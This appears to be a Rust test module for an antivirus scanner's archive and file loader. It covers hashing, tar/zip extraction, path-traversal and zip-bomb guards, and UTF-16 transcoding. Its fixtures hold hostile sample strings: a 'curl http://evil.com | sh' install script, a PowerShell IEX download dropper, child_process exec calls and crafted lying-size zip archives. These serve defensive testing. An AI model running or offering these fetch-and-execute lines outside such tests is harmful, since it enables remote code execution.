            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn sha256_non_empty() {
        // SHA-256("abc") verified via `echo -n abc | sha256sum`.
        let digest = hex_sha256(b"abc");
        assert_eq!(
            digest,
            "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"
        );
    }

    // ── directory loading ─────────────────────────────────────────────────────

    #[test]
    fn load_directory_basic() {
        use std::fs;
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(dir.path().join("index.js"), b"console.log('hi')").unwrap();
        fs::write(dir.path().join("package.json"), b"{\"name\":\"foo\"}").unwrap();
        fs::create_dir(dir.path().join(".git")).unwrap();
        fs::write(dir.path().join(".git").join("ORIG_HEAD"), b"deadbeef").unwrap();

        let result = Loader::load(dir.path(), &default_cfg()).expect("load");
        // .git entries must be skipped.
        assert!(!result.files.iter().any(|f| f.rel_path.contains(".git")));
        // package.json must be parsed.
        assert!(result.package_json.is_some());
        let pkg = result.package_json.as_ref().unwrap();
        assert_eq!(pkg["name"], "foo");
        // index.js must be present.
        assert!(
            result
                .files
                .iter()
                .any(|f| f.rel_path.ends_with("index.js"))
        );
        assert_eq!(result.errors.len(), 0);
    }

    #[test]
    fn load_directory_skips_oversized() {
        use std::fs;
        let dir = tempfile::tempdir().expect("tempdir");
        let big: Vec<u8> = vec![b'A'; 2048];
        fs::write(dir.path().join("big.bin"), &big).unwrap();
        fs::write(dir.path().join("small.txt"), b"ok").unwrap();

        let cfg = ScanConfig {
            max_file_size: 1024,
            ..ScanConfig::default()
        };
        let result = Loader::load(dir.path(), &cfg).expect("load");
        // big.bin should be skipped with an error entry.
        assert!(!result.files.iter().any(|f| f.rel_path.ends_with("big.bin")));
        assert!(
            result
                .files
                .iter()
                .any(|f| f.rel_path.ends_with("small.txt"))
        );
        assert!(!result.errors.is_empty());
    }

    // ── bytes loading ─────────────────────────────────────────────────────────

    #[test]
    fn load_bytes_plain_file() {
        let data = b"console.log('test')";
        let result = Loader::load_bytes("index.js", data, &default_cfg()).expect("load");
        assert_eq!(result.files.len(), 1);
        assert_eq!(result.files[0].kind, FileKind::Javascript);
        assert_eq!(result.files[0].rel_path, "index.js");
        assert_eq!(result.files[0].data, data);
        assert_eq!(result.bytes_scanned, data.len() as u64);
    }

    #[test]
    fn load_bytes_elf_binary() {
        let mut data = b"\x7fELF\x02\x01\x01\x00".to_vec();
        data.extend_from_slice(&[0u8; 56]);
        let result = Loader::load_bytes("libc.so", &data, &default_cfg()).expect("load");
        assert_eq!(result.files[0].kind, FileKind::ElfBinary);
    }

    // ── tgz extraction ───────────────────────────────────────────────────────

    /// Build a minimal .tgz in memory.
    fn make_tgz(files: &[(&str, &[u8])]) -> Vec<u8> {
        use flate2::{Compression, write::GzEncoder};

        let mut gz_buf = Vec::new();
        {
            let enc = GzEncoder::new(&mut gz_buf, Compression::default());
            let mut tar = tar::Builder::new(enc);
            for (name, data) in files {
                let mut header = tar::Header::new_gnu();
                header.set_size(data.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                tar.append_data(&mut header, name, *data).unwrap();
            }
            let enc = tar.into_inner().unwrap();
            enc.finish().unwrap();
        }
        gz_buf
    }

    #[test]
    fn load_tgz_extracts_files() {
        let tgz = make_tgz(&[
            ("package/package.json", br#"{"name":"evil-pkg"}"#),
            ("package/index.js", b"require('child_process').exec('id')"),
            ("package/install.sh", b"curl http://evil.com | sh"),
        ]);

        let result = Loader::load_bytes("pkg.tgz", &tgz, &default_cfg()).expect("load");
        assert_eq!(result.files.len(), 3);
        assert!(result.package_json.is_some());
        let pkg = result.package_json.as_ref().unwrap();
        assert_eq!(pkg["name"], "evil-pkg");

        let paths: Vec<_> = result.files.iter().map(|f| &f.rel_path).collect();
        assert!(paths.iter().any(|p| p.ends_with("index.js")));
        assert!(paths.iter().any(|p| p.ends_with("install.sh")));

        // Kinds should be detected.
        let js_file = result
            .files
            .iter()
            .find(|f| f.rel_path.ends_with("index.js"))
            .unwrap();
        assert_eq!(js_file.kind, FileKind::Javascript);
        let sh_file = result
            .files
            .iter()
            .find(|f| f.rel_path.ends_with("install.sh"))
            .unwrap();
        assert_eq!(sh_file.kind, FileKind::Shell);
    }

    /// Build a raw (POSIX ustar) tar block for a single regular file, bypassing
    /// the `tar` crate's path-safety validation so we can test that the *loader's*
    /// path-traversal guard rejects such entries.
    fn make_raw_tar_with_traversal(traversal_name: &str, safe_name: &str) -> Vec<u8> {
        fn make_block(name: &str, content: &[u8]) -> Vec<u8> {
            let mut block = vec![0u8; 512];
            // name (offset 0, 100 bytes).
            let name_bytes = name.as_bytes();
            let name_len = name_bytes.len().min(99);
            block[..name_len].copy_from_slice(&name_bytes[..name_len]);
            // mode (offset 100, 8 bytes): 0000644\0.
            block[100..107].copy_from_slice(b"0000644");
            // uid/gid (offsets 108/116).
            block[108..115].copy_from_slice(b"0000000");
            block[116..123].copy_from_slice(b"0000000");
            // size (offset 124, 12 bytes) in octal.
            let size_str = format!("{:011o}\0", content.len());
            block[124..136].copy_from_slice(size_str.as_bytes());
            // mtime (offset 136): zeros.
            // typeflag (offset 156): '0' = regular file.
            block[156] = b'0';
            // magic/version for ustar (offsets 257/263).
            block[257..262].copy_from_slice(b"ustar");
            block[263..265].copy_from_slice(b"00");
            // Checksum (offset 148, 8 bytes): sum of all header bytes,
            // treating the checksum field itself as spaces.
            block[148..156].fill(b' ');
            let chk: u32 = block.iter().map(|&b| b as u32).sum();
            let chk_str = format!("{:06o}\0 ", chk);
            block[148..156].copy_from_slice(chk_str.as_bytes());
            block
        }

        let mut tar = Vec::new();
        // Traversal header + data.
        tar.extend_from_slice(&make_block(traversal_name, b"evil"));
        tar.extend_from_slice(b"evil"); // content
        // Pad to 512-byte boundary.
        let pad_len = 508_usize; // 512 - (4 bytes of "evil" % 512)
        if pad_len < 512 {
            tar.extend_from_slice(&vec![0u8; pad_len]);
        }
        // Safe header + data.
        tar.extend_from_slice(&make_block(safe_name, b"ok"));
        tar.extend_from_slice(b"ok\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"); // 512 bytes total for content
        // End-of-archive: two 512-byte zero blocks.
        tar.extend_from_slice(&[0u8; 1024]);

        // Gzip-compress the tar.
        use flate2::{Compression, write::GzEncoder};
        use std::io::Write;
        let mut gz_buf = Vec::new();
        let mut enc = GzEncoder::new(&mut gz_buf, Compression::default());
        enc.write_all(&tar).expect("gzip");
        enc.finish().expect("gzip finish");
        gz_buf
    }

    #[test]
    fn load_tgz_rejects_path_traversal() {
        // Build a raw tgz with a literal "../outside.js" path in the tar header.
        // We bypass the `tar` crate builder (which rejects such paths) and write
        // the raw header bytes directly, so the scanner's own guard is exercised.
        let tgz = make_raw_tar_with_traversal("../outside.js", "safe/file.txt");

        let result = Loader::load_bytes("pkg.tgz", &tgz, &default_cfg()).expect("load");
        // The traversal entry must be rejected.
        assert!(
            result.files.iter().all(|f| !f.rel_path.contains("..")),
            "traversal entry should be rejected: {:?}",
            result.files.iter().map(|f| &f.rel_path).collect::<Vec<_>>()
        );
        // The safe entry must be retained.
        assert!(
            result
                .files
                .iter()
                .any(|f| f.rel_path.ends_with("file.txt")),
            "safe entry should be present"
        );
        // The rejection must be recorded in errors.
        assert!(!result.errors.is_empty());
    }

    /// An **uncompressed** tar (no gzip wrapper) must be expanded so its entries
    /// are scanned individually — otherwise malware re-wrapped in a plain `.tar`
    /// is stored as one opaque `Archive` blob that every content engine skips.
    #[test]
    fn load_uncompressed_tar_expands_entries() {
        use std::io::Cursor;
        let mut tar_bytes = Vec::new();
        {
            let mut tar = tar::Builder::new(Cursor::new(&mut tar_bytes));
            for (name, data) in [
                (
                    "pkg/index.js",
                    b"require('child_process').exec('id')".as_ref(),
                ),
                ("pkg/install.sh", b"curl http://evil.com | sh".as_ref()),
            ] {
                let mut header = tar::Header::new_gnu();
                header.set_size(data.len() as u64);
                header.set_mode(0o644);
                header.set_cksum();
                tar.append_data(&mut header, name, data).unwrap();
            }
            tar.finish().unwrap();
        }
        // Sanity: the buffer is a real ustar archive, not gzip.
        assert!(is_tar_magic(&tar_bytes));
        assert!(!is_gzip_magic(&tar_bytes));

        let result = Loader::load_bytes("pkg.tar", &tar_bytes, &default_cfg()).expect("load");
        // Both entries must be present as their own files (expanded, not a blob).
        assert!(
            result
                .files
                .iter()
                .any(|f| f.rel_path.ends_with("index.js")),
            "index.js must be expanded from the uncompressed tar: {:?}",
            result.files.iter().map(|f| &f.rel_path).collect::<Vec<_>>()
        );
        assert!(
            result
                .files
                .iter()
                .any(|f| f.rel_path.ends_with("install.sh")),
            "install.sh must be expanded from the uncompressed tar"
        );
        // The tar itself must NOT be retained as a single opaque Archive blob.
        assert!(
            !result.files.iter().any(|f| f.rel_path == "pkg.tar"),
            "the tar container must be expanded, not stored whole"
        );
    }

    // ── zip extraction ───────────────────────────────────────────────────────

    /// Build a minimal ZIP in memory.
    fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
        use std::io::{Cursor, Write};
        use zip::CompressionMethod;
        use zip::write::{FileOptions, ZipWriter};

        let mut buf = Vec::new();
        let cursor = Cursor::new(&mut buf);
        let mut zw = ZipWriter::new(cursor);
        let opts: FileOptions<()> =
            FileOptions::default().compression_method(CompressionMethod::Deflated);
        for (name, data) in files {
            zw.start_file(*name, opts).unwrap();
            zw.write_all(data).unwrap();
        }
        zw.finish().unwrap();
        buf
    }

    #[test]
    fn load_zip_extracts_files() {
        let zip = make_zip(&[
            ("src/index.ts", b"const x: number = 1;"),
            ("package.json", br#"{"name":"test-zip"}"#),
        ]);

        let result = Loader::load_bytes("pkg.zip", &zip, &default_cfg()).expect("load");
        assert_eq!(result.files.len(), 2);
        assert!(result.package_json.is_some());

        let ts_file = result
            .files
            .iter()
            .find(|f| f.rel_path.ends_with("index.ts"))
            .unwrap();
        assert_eq!(ts_file.kind, FileKind::TypeScript);
    }

    #[test]
    fn load_zip_rejects_path_traversal() {
        let zip = make_zip(&[("../../etc/passwd", b"root:x:0:0"), ("legit.js", b"ok")]);

        let result = Loader::load_bytes("evil.zip", &zip, &default_cfg()).expect("load");
        assert!(result.files.iter().all(|f| !f.rel_path.contains("..")));
        assert!(result.files.iter().any(|f| f.rel_path == "legit.js"));
        assert!(!result.errors.is_empty());
    }

    // ── zip-bomb guard ────────────────────────────────────────────────────────

    /// Zip out `payload` under `name` (deflate), then falsify the central-
    /// directory *uncompressed size* field to 0. `zip::ZipArchive` reads the
    /// size from the central directory, so `entry.size()` then reports 0 while
    /// the deflate stream still expands to the full payload — the exact shape
    /// used to bypass the pre-read budget/size checks.
    fn make_zip_with_lying_size(name: &str, payload: &[u8]) -> Vec<u8> {
        use std::io::{Cursor, Write};
        use zip::CompressionMethod;
        use zip::write::{FileOptions, ZipWriter};

        let mut buf = Vec::new();
        {
            let cursor = Cursor::new(&mut buf);
            let mut zw = ZipWriter::new(cursor);
            let opts: FileOptions<()> =
                FileOptions::default().compression_method(CompressionMethod::Deflated);
            zw.start_file(name, opts).unwrap();
            zw.write_all(payload).unwrap();
            zw.finish().unwrap();
        }
        // Central-directory file-header signature, then zero the uncompressed
        // size field (offset 24 within the record).
        let sig = [0x50, 0x4b, 0x01, 0x02];
        let pos = buf
            .windows(4)
            .position(|w| w == sig)
            .expect("central dir header present");
        buf[pos + 24..pos + 28].copy_from_slice(&0u32.to_le_bytes());
        buf
    }

    /// A single entry whose header lies about its (uncompressed) size must not be
    /// able to force a decompression larger than `max_file_size` into memory: the
    /// per-entry read is capped, the oversize entry is skipped, and the bytes we
    /// were forced to decompress are charged to the extracted-bytes budget.
    #[test]
    fn zip_lying_size_header_is_capped_and_charged() {
        // 4 MiB highly-compressible payload; tiny per-file cap so it is skipped.
        let payload = vec![b'A'; 4 * 1024 * 1024];
        let zip = make_zip_with_lying_size("bomb.txt", &payload);

        // Per-file cap 64 KiB, generous total budget: the entry over-reads past
        // the cap, so it must be skipped (not retained) — and NOT silently allow
        // the full 4 MiB to be read unbounded.
        let cfg = ScanConfig {
            max_file_size: 64 * 1024,
            max_extracted_bytes: 1024 * 1024 * 1024,
            ..ScanConfig::default()
        };
        let result = Loader::load_bytes("liar.zip", &zip, &cfg).expect("load");
        assert!(
            result.files.iter().all(|f| f.rel_path != "bomb.txt"),
            "oversize lying entry must not be retained"
        );
        // `zip` 9 enforces the declared size itself and errors out with
        // "File is larger than its declared uncompressed size"; older versions
        // let the read run on and tripped our own "exceeds limit" check. Either
        // way the skip must be recorded.
        let recorded = result
            .errors
            .iter()
            .any(|e| e.contains("exceeds limit") || e.contains("declared"));
        assert!(recorded, "skip must be recorded: {:?}", result.errors);
    }

    /// A flood of crafted oversize (lying-size) entries must be bounded by the
    /// extracted-bytes budget rather than forcing unbounded decompression work:
    /// because the decompressed bytes are charged even when the entry is skipped,
    /// the budget trips instead of processing every entry to completion.
    #[test]
    fn zip_lying_size_flood_hits_extracted_budget() {
        use std::io::{Cursor, Write};
        use zip::CompressionMethod;
        use zip::write::{FileOptions, ZipWriter};

        // Ten entries, each a 1 MiB compressible payload with a falsified size.
        let mut buf = Vec::new();
        {
            let cursor = Cursor::new(&mut buf);
            let mut zw = ZipWriter::new(cursor);
            let opts: FileOptions<()> =
                FileOptions::default().compression_method(CompressionMethod::Deflated);
            let payload = vec![b'A'; 1024 * 1024];
            for i in 0..10 {
                zw.start_file(format!("e{i}.txt"), opts).unwrap();
                zw.write_all(&payload).unwrap();
            }
            zw.finish().unwrap();
        }
        // Zero every central-directory record's uncompressed-size field.
        let sig = [0x50, 0x4b, 0x01, 0x02];
        let mut from = 0;
        while let Some(rel) = buf[from..].windows(4).position(|w| w == sig) {
            let pos = from + rel;
            buf[pos + 24..pos + 28].copy_from_slice(&0u32.to_le_bytes());
            from = pos + 4;
        }

        // Per-file cap 64 KiB (every entry over-reads and is skipped) and a total
        // budget of 256 KiB: the charged skipped reads exhaust the budget after a
        // few entries and the loader stops with LimitExceeded — proving a flood
        // cannot force decompression of all 10 MiB.
        let cfg = ScanConfig {
            max_file_size: 64 * 1024,
            max_extracted_bytes: 256 * 1024,
            ..ScanConfig::default()
        };
        let result = Loader::load_bytes("flood.zip", &buf, &cfg);
        // `zip` 9 rejects each lying entry as soon as it decompresses past its
        // declared size, so the flood is cut short per entry instead of being
        // charged against the budget. Accept either bounded outcome, but never
        // a retained file.
        match result {
            Err(AvError::LimitExceeded(_)) => {}
            Ok(loaded) => {
                assert!(loaded.files.is_empty(), "lying-size entries must not be retained");
                assert!(!loaded.errors.is_empty(), "rejections must be recorded");
            }
            other => panic!("flood must be bounded, got: {other:?}"),
        }
    }

    #[test]
    fn zip_bomb_rejected() {
        // Craft a zip that claims a large uncompressed file but cap our budget.
        // Use a highly compressible payload so it fits as a small zip.
        let payload: Vec<u8> = vec![b'A'; 3000]; // 3 KiB compressible payload
        let zip = make_zip(&[("bomb.txt", &payload)]);

        // Budget only 1 KiB extracted — should trigger the bomb guard.
        let cfg = ScanConfig {
            max_extracted_bytes: 1024,
            max_file_size: 32 * 1024 * 1024,
            ..ScanConfig::default()
        };

        let result = Loader::load_bytes("bomb.zip", &zip, &cfg);
        assert!(matches!(result, Err(AvError::LimitExceeded(_))));
    }

    // ── tgz bomb guard ────────────────────────────────────────────────────────

    #[test]
    fn tgz_bomb_rejected() {
        // A single 3 KiB entry, but budget is 1 KiB.
        let tgz = make_tgz(&[("bomb.txt", &vec![b'A'; 3000])]);

        let cfg = ScanConfig {
            max_extracted_bytes: 1024,
            max_file_size: 32 * 1024 * 1024,
            ..ScanConfig::default()
        };

        let result = Loader::load_bytes("bomb.tgz", &tgz, &cfg);
        assert!(matches!(result, Err(AvError::LimitExceeded(_))));
    }

    // ── file count limit ──────────────────────────────────────────────────────

    #[test]
    fn file_count_limit_triggers_error() {
        let cfg = ScanConfig {
            max_total_files: 2,
            ..ScanConfig::default()
        };
        let zip = make_zip(&[
            ("a.js", b"1"),
            ("b.js", b"2"),
            ("c.js", b"3"), // this one should tip over the limit
        ]);

        let result = Loader::load_bytes("many.zip", &zip, &cfg);
        assert!(matches!(result, Err(AvError::LimitExceeded(_))));
    }

    // ── archive depth limit ───────────────────────────────────────────────────

    #[test]
    fn nested_archive_beyond_depth_skipped_not_extracted() {
        // Create a zip-inside-a-zip.
        let inner_zip = make_zip(&[("secret.js", b"evil()")]);
        let outer_zip = make_zip(&[("inner.zip", &inner_zip)]);

        // depth limit = 1: the outer layer is at depth 1 (allowed), but
        // the inner.zip would need depth 2 — should be left as Archive, not extracted.
        let cfg = ScanConfig {
            max_archive_depth: 1,
            ..ScanConfig::default()
        };

        let result = Loader::load_bytes("outer.zip", &outer_zip, &cfg).expect("load");
        // inner.zip should be stored as a raw Archive, not expanded.
        let has_secret = result
            .files
            .iter()
            .any(|f| f.rel_path.ends_with("secret.js"));
        assert!(
            !has_secret,
            "inner archive should not be extracted at depth limit"
        );
        // inner.zip itself should be present.
        let has_inner = result
            .files
            .iter()
            .any(|f| f.rel_path.ends_with("inner.zip"));
        assert!(has_inner, "inner.zip should be stored as raw file");
    }

    // ── sha256 per file unit ──────────────────────────────────────────────────

    #[test]
    fn file_unit_sha256_correct() {
        let data = b"hello world";
        let result = Loader::load_bytes("hw.txt", data, &default_cfg()).expect("load");
        let f = &result.files[0];
        // SHA-256("hello world") verified via `echo -n 'hello world' | sha256sum`.
        assert_eq!(
            f.sha256,
            "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9"
        );
        // Digest must be lowercase hex of exactly 64 chars (32 bytes).
        assert_eq!(f.sha256.len(), 64);
        assert!(f.sha256.chars().all(|c| c.is_ascii_hexdigit()));
    }

    // ── not-found error ───────────────────────────────────────────────────────

    #[test]
    fn load_nonexistent_path_err() {
        let result = Loader::load(
            Path::new("/tmp/rb-antivirus-definitely-does-not-exist-xyzzy"),
            &default_cfg(),
        );
        assert!(matches!(result, Err(AvError::NotFound(_))));
    }

    // ── magic-bytes detection edge cases ─────────────────────────────────────

    #[test]
    fn is_gzip_magic_detects() {
        assert!(is_gzip_magic(&[0x1F, 0x8B, 0x08, 0x00]));
        assert!(!is_gzip_magic(&[0x1F, 0x00]));
        assert!(!is_gzip_magic(&[]));
    }

    #[test]
    fn is_zip_magic_detects() {
        assert!(is_zip_magic(&[b'P', b'K', 0x03, 0x04]));
        assert!(!is_zip_magic(&[b'P', b'X', 0x03, 0x04]));
        assert!(!is_zip_magic(&[]));
    }

    // ── tight config / no false-positive on benign dir ────────────────────────

    #[test]
    fn benign_dir_no_errors() {
        use std::fs;
        let dir = tempfile::tempdir().expect("tempdir");
        fs::write(dir.path().join("README.md"), b"# My Project\nHello world").unwrap();
        fs::write(dir.path().join("main.py"), b"print('hello')").unwrap();
        fs::write(dir.path().join("config.json"), b"{\"key\":\"value\"}").unwrap();

        let result = Loader::load(dir.path(), &default_cfg()).expect("load");
        assert_eq!(result.errors.len(), 0);
        assert_eq!(result.files.len(), 3);
        // Python file classified correctly.
        let py = result
            .files
            .iter()
            .find(|f| f.rel_path.ends_with("main.py"))
            .unwrap();
        assert_eq!(py.kind, FileKind::Python);
        // JSON file classified correctly (not Manifest).
        let json = result
            .files
            .iter()
            .find(|f| f.rel_path.ends_with("config.json"))
            .unwrap();
        assert_eq!(json.kind, FileKind::Json);
    }

    // ── UTF-16 transcoding ────────────────────────────────────────────────────

    /// Encode `s` as UTF-16LE bytes, optionally with a BOM.
    fn utf16le(s: &str, bom: bool) -> Vec<u8> {
        let mut out = Vec::new();
        if bom {
            out.extend_from_slice(&[0xFF, 0xFE]);
        }
        for u in s.encode_utf16() {
            out.extend_from_slice(&u.to_le_bytes());
        }
        out
    }

    fn utf16be(s: &str, bom: bool) -> Vec<u8> {
        let mut out = Vec::new();
        if bom {
            out.extend_from_slice(&[0xFE, 0xFF]);
        }
        for u in s.encode_utf16() {
            out.extend_from_slice(&u.to_be_bytes());
        }
        out
    }

    // TRUE-POSITIVE: a UTF-16LE script (with BOM) is transcoded to UTF-8 so the
    // text engines see valid source instead of a NUL-dense blob.
    #[test]
    fn utf16le_bom_script_transcoded_to_utf8() {
        let src = "IEX (New-Object Net.WebClient).DownloadString('http://evil')\n";
        let bytes = utf16le(src, true);
        // Sanity: raw UTF-16 is NUL-dense and would classify as non-textual.
        assert!(
            !crate::engine::FileUnit {
                rel_path: "x".into(),
                data: bytes.clone(),
                kind: FileKind::PowerShell,
                sha256: String::new(),
            }
            .looks_textual()
        );

        let result = Loader::load_bytes("stage.ps1", &bytes, &default_cfg()).expect("load");
        let f = &result.files[0];
        assert_eq!(f.text_lossy(), src, "UTF-16 script must transcode to UTF-8");
        assert!(f.looks_textual(), "transcoded script must be textual");
    }

    // TRUE-POSITIVE: UTF-16BE without a BOM is detected by the alternating-NUL
    // pattern and transcoded.
    #[test]
    fn utf16be_no_bom_script_transcoded() {
        let src = "require('child_process').execSync('id')\n";
        let bytes = utf16be(src, false);
        let result = Loader::load_bytes("mod.js", &bytes, &default_cfg()).expect("load");
        assert_eq!(result.files[0].text_lossy(), src);
    }

    // TRUE-POSITIVE (end-to-end): a UTF-16LE PowerShell dropper is caught by the
    // behavioral engine after transcoding, where the raw UTF-16 would scan Clean.
    #[test]
    fn utf16_powershell_dropper_is_scannable() {
        use crate::engine::DetectionEngine;
        use crate::engines::ScriptBehaviorEngine;
        let src = "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')\n";
        let bytes = utf16le(src, true);
        let loaded = Loader::load_bytes("stage.ps1", &bytes, &default_cfg()).expect("load");
        let ctx = crate::engine::ScanContext {
            target_name: "t".into(),
            files: &loaded.files,
            package_json: None,
            config: &default_cfg(),
        };
        let findings = ScriptBehaviorEngine.scan(&ctx);
        assert!(
            findings
                .iter()
                .any(|f| f.rule_id.as_deref() == Some("SB_PS_IEX_DOWNLOAD")),
            "UTF-16 PowerShell IEX dropper must be detected after transcoding; got: {findings:#?}"
        );
    }

    // TRUE-NEGATIVE: a genuine ELF binary (NULs scattered on both parities) must
    // NOT be transcoded — its bytes and kind are preserved.
    #[test]
    fn elf_binary_not_transcoded() {
        let mut data = b"\x7fELF\x02\x01\x01\x00".to_vec();
        // Realistic-ish padding with NULs on both parities and non-NUL bytes.
        for i in 0..512u32 {
            data.push((i % 7) as u8); // mixes NUL and non-NUL across parities
        }
        let original = data.clone();
        let result = Loader::load_bytes("prog", &data, &default_cfg()).expect("load");
        assert_eq!(result.files[0].kind, FileKind::ElfBinary);
        assert_eq!(result.files[0].data, original, "binary must be untouched");
    }

    // TRUE-NEGATIVE: ordinary UTF-8 source with a couple of injected NUL bytes
    // (the pass-1 evasion shape) must NOT be misdetected as UTF-16.
    #[test]
    fn utf8_with_few_nuls_not_transcoded() {
        let mut data = b"const x = require('child_process');\n".to_vec();
        data.insert(3, 0); // a lone NUL — not an alternating pattern
        let original = data.clone();
        let result = Loader::load_bytes("a.js", &data, &default_cfg()).expect("load");
        assert_eq!(
            result.files[0].data, original,
            "UTF-8 with sparse NULs must not be transcoded as UTF-16"
        );
    }

    #[test]
    fn tight_limits_apply() {
        use std::fs;
        let dir = tempfile::tempdir().expect("tempdir");
        // Write 6 files — limit is 5 in tight_cfg() so the 6th triggers an error.
        for i in 0..6 {
            fs::write(dir.path().join(format!("f{}.txt", i)), b"text").unwrap();
        }
        let result = Loader::load(dir.path(), &tight_cfg());
        // Should hit the file-count limit.
        assert!(matches!(result, Err(AvError::LimitExceeded(_))));
    }
}
